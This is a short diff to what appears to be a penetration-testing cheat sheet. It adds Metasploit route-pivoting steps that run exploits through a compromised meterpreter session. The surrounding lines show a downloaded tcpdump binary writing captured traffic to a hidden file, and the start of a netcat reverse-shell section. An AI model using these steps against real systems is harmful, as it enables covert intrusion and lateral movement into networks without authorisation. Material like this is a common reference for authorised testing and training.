@@ -10,6 +10,17 @@ wget -q https://raw.githubusercontent.com/yunchih/static-binaries/master/tcpdump
 ./tcpdump -n -i eth0 -s 0 -w .packets.pcap #. - hidden file, slightly less obvious
 =======================================================================
 
+-- # MSF #--
+#ROUTE PIVOTING
+background exisiting meterpreter session
+route add <iprange>/<CIDR>
+
+route add 10.10.10.0/24 1 #session 1
+set RHOST <IP in range above>
+exploit #this exploit will be run through the pivot route set up
+
+=======================================================================
+
 --# NETCAT #--
 #reverse shell
 listener:
